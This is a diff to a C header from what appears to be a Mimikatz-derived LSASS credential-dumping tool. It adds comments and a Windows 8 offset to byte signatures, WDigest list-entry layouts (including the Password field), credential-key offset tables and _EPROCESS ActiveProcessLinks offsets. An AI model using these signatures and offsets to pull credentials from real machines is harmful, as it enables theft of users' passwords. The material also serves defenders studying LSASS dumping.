@@ -1,13 +1,18 @@
 #pragma once
 
-// Used when comparing version numbers
-// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/inc/globals.h#L104
+//
+////
+//// Used when comparing version numbers
+//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/inc/globals.h#L104
+////
+//
+
 #define KULL_M_WIN_BUILD_XP		2600
 #define KULL_M_WIN_BUILD_2K3	3790
 #define KULL_M_WIN_BUILD_VISTA	6000
 #define KULL_M_WIN_BUILD_7		7600
-#define KULL_M_WIN_BUILD_8		9200
-#define KULL_M_WIN_BUILD_BLUE	9600
+#define KULL_M_WIN_BUILD_8		9200 // (Windows 8 / Server 2012)
+#define KULL_M_WIN_BUILD_BLUE	9600 // (Windows 8.1 / Server 2012 R2)
 #define KULL_M_WIN_BUILD_10_1507	10240
 #define KULL_M_WIN_BUILD_10_1511	10586
 #define KULL_M_WIN_BUILD_10_1607	14393
@@ -25,14 +30,40 @@
 #define KULL_M_WIN_BUILD_11_24H2    26100
 
 
-// Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz) - works on windows 10
-// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c#L14C6-L14C25
-unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 };
+
+
+//
+////
+//// Below is the WDigest structure and byte signature
+//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c#L14C6-L14C25
+////
+//
+
+ unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 }; // PTRN_WIN6_PasswdSet from Mimikatz
+/*  
+    Singular WDigest List Entry (partially from _KIWI_WDIGEST_LIST_ENTRY)
+
+    struct _KIWI_WDIGEST_LIST_ENTRY *Flink; // 0
+    struct _KIWI_WDIGEST_LIST_ENTRY *Blink; // 0x8
+    ULONG	UsageCount;                     // 0x10
+    struct _KIWI_WDIGEST_LIST_ENTRY *This;  // 0x18
+    LUID LocallyUniqueIdentifier;           // 0x20
+    ?? unknown                              // 0x28 
+    UNICODE_STRING Username                 // 0x30
+    UNICODE_STRING Domain                   // 0x40
+    UNICODE_STRING Password                 // 0x50
+*/
 
 
 
-// Used for getting the offsets to the credential keys
-// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
+
+//
+////
+//// Below is used for getting the offsets to the credential keys
+//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
+////
+//
+
 typedef struct {
     DWORD WindowsVersion;
     unsigned char* credentialKeySig;
@@ -58,14 +89,21 @@ LsassCredentialKeyOffsets LsassKeyOffsetsArray[] = {
 
 
 
-// Used for getting the ActiveProcessLinks member offset in the _EPROCESS structure
-// Vergilius Project
+
+//
+////
+//// Below is used for getting the ActiveProcessLinks member offset in the _EPROCESS structure
+//// Obtained from Vergilius Project - https://www.vergiliusproject.com/
+////
+//
+
 typedef struct {
     DWORD WindowsVersion;
     int ActiveProcessLinksOffset;
 } EPROCESSOffsets;
 
 EPROCESSOffsets EPROCESSOffsetsArray[] = {
+{KULL_M_WIN_BUILD_8, 0x2e8},       // 9600 (Windows 8.1 / Server 2012 R2) to 9200 (Windows 8 / Server 2012)
 {KULL_M_WIN_BUILD_10_1507, 0x2f0}, // (1607) 14393 to (1507) 10240
 {KULL_M_WIN_BUILD_10_1703, 0x2e8}, // (1809) 17763 to (1703) 15063
 {KULL_M_WIN_BUILD_10_1903, 0x2f0}, // (1909) 18363 to (1903) 18362
@@ -75,8 +113,13 @@ EPROCESSOffsets EPROCESSOffsetsArray[] = {
 
 
 
-// Used for getting LogonSessionList
-// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c#L15
+
+//
+////
+//// Below is used for getting LogonSessionList
+//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c#L15
+////
+//
 
 typedef struct {
     DWORD WindowsVersion;
